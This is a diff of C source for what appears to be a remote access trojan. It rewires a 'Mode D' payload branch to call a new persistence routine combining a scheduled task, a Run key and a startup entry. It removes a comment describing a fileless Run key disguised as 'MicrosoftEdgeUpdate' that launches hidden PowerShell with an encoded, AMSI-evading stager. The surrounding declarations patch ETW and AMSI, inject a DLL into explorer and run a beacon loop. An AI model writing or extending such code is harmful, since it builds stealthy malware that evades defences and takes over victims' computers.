@@ -21,6 +21,7 @@ void patch_etw(void);
 void patch_amsi(void);
 int  install_persistence(const wchar_t *exe_path, const wchar_t *arguments);
 int  install_run_key(void);
+int  install_persistence_modeD(void);
 void beacon_loop(void);
 int  inject_dll_into_explorer(void);   /* process_inject.c — T1055.003 */
 
@@ -224,17 +225,9 @@ static DWORD WINAPI payload_thread(LPVOID lpParam) {
             _rat_dbg("before_beacon_loop");
             beacon_loop();
 
-        } else if (bModeD) {
-            /* ── Mode D: fileless, gira dentro sihost/dllhost ────────────────
-             * Nessun file su disco, nessun nuovo processo visibile.
-             * Persistenza tramite Run key fileless (T1547.001):
-             *   HKCU\...\Run\MicrosoftEdgeUpdate = powershell.exe -WindowStyle
-             *   Hidden -EncodedCommand <stager XOR-AMSI b64>
-             * Install_run_key scrive in HKCU → nessun privilegio elevato richiesto.
-             */
+        }  else if (bModeD) {
             _rat_dbg("mode_D");
-            install_run_key();
-            CoUninitialize();
+            install_persistence_modeD();   /* L1 task + L2 run key + L3 startup */
             _rat_dbg("before_beacon_loop");
             beacon_loop();
 
